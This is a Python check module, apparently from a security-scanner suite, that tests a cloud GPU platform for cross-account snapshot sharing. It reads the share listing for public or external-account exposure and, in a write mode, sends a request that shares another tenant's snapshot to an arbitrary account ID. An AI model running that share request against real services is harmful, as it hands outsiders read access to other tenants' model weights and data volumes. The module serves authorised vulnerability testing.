"""云快照跨账户共享 — snapshot 共享给任意账户（public），他租户可挂载读取。

检测面：GET /cloud/snapshot/share 返回 public=true / shared_with 含外部账户；
backup-write 下 POST /cloud/snapshot/share 以 tenant-a 身份把 tenant-b 快照共享给 999999999999 → 200。
fixed：仅 owner + 同账户 allowlist（403）。
"""
from __future__ import annotations

import sys
from pathlib import Path

_REPO = Path(__file__).resolve().parents[3]
if str(_REPO) not in sys.path:
    sys.path.insert(0, str(_REPO))

from trident.modules._gpu_cloud_common import (  # noqa: E402
    Trace, base_url, detail, ok, read_headers, resolve_mode, resp, write_headers,
)

KEY = "cloud-snapshot-share"
WRITES = True


def run(ctx: dict, params: dict) -> dict:
    base = base_url(params)
    mode, note = resolve_mode(params, WRITES)
    if not base:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    snapshot = str(params.get("snapshot") or "snap-weights-b")
    target_account = str(params.get("target_account") or "999999999999")
    t = Trace(ctx, KEY)
    findings: list[dict] = []

    listing = t.call("GET", f"{base}/cloud/snapshot/share?snapshot={snapshot}",
                     headers=read_headers(params))
    payload = resp(listing)
    if ok(listing) and (payload.get("public") or payload.get("cross_account")):
        findings.append({
            "sev": "high",
            "title": "云快照 public/跨账户共享可见（他租户可挂载）",
            "detail": detail({
                "route": "/cloud/snapshot/share",
                "http_status": listing.get("status"),
                "snapshot": snapshot,
                "owner": payload.get("owner", ""),
                "account": payload.get("account", ""),
                "public": bool(payload.get("public")),
                "shared_with": payload.get("shared_with") or [],
                "snapshot_uri": payload.get("snapshot_uri", ""),
                "note": "快照共享清单暴露外部账户：快照含权重/数据卷，挂载即跨租户读取",
            }),
        })

    share = {}
    if mode == "backup-write":
        share = t.call("POST", f"{base}/cloud/snapshot/share", {
            "snapshot": snapshot,
            "target_account": target_account,
            "permission": "read",
        }, headers=write_headers(params))
        shared = resp(share)
        if ok(share) and shared.get("cross_account"):
            findings.append({
                "sev": "high",
                "title": "云快照共享给任意账户成功（跨账户挂载读取）",
                "detail": detail({
                    "route": "/cloud/snapshot/share",
                    "http_status": share.get("status"),
                    "auth": "none",
                    "snapshot": snapshot,
                    "owner": shared.get("owner", ""),
                    "target_account": shared.get("target_account", target_account),
                    "shared_with": shared.get("shared_with") or [],
                    "public": bool(shared.get("public")),
                    "cross_account": True,
                    "snapshot_uri": shared.get("snapshot_uri", ""),
                    "state_sha256": shared.get("state_sha256", ""),
                    "note": "快照共享无账户 allowlist：外部账户获得 read 权限即可挂载权重卷",
                }),
            })

    artifact = t.dump()
    summary = (f"share_list={listing.get('status')} share={share.get('status', '-')} "
               f"findings={len(findings)} mode={mode}")
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
